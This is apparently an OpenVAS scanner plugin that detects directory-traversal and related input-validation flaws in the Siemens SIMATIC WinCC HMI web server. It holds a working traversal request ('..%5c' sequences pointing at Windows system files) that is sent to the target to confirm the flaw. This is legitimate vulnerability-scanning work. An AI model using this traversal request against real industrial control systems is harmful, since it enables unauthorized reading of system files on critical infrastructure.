###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simatic_wincc_hmi_51836.nasl 11564 2018-09-24 07:29:50Z cfischer $
#
# Siemens SIMATIC WinCC HMI Web Server Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103572");
  script_bugtraq_id(51836);
  script_cve_id("CVE-2011-4512", "CVE-2011-4878", "CVE-2011-4879");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:C");
  script_version("$Revision: 11564 $");

  script_name("Siemens SIMATIC WinCC HMI Web Server Multiple Input Validation Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51836");
  script_xref(name:"URL", value:"http://www.automation.siemens.com/mcms/human-machine-interface/en/visualization-software/scada/Pages/Default.aspx");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-030-01A.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-030-01.pdf");

  script_tag(name:"last_modification", value:"$Date: 2018-09-24 09:29:50 +0200 (Mon, 24 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-09-20 11:25:41 +0200 (Thu, 20 Sep 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Siemens SIMATIC WinCC is prone to an HTTP-header-injection issue, a
  directory-traversal issue, and an arbitrary memory-read access issue because the application fails to
  properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker can exploit these issues to gain elevated
  privileges, obtain sensitive information, or cause denial-of-service conditions.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

url = '/www/start.html';

if(http_vuln_check(port:port, url:url, pattern:"Miniweb Start Page", usecache:TRUE)) {

  files = traversal_files("windows");

  foreach file (keys(files)) {

    url = '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c' + files[file];

    if(http_vuln_check(port:port, url:url, pattern:file)) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);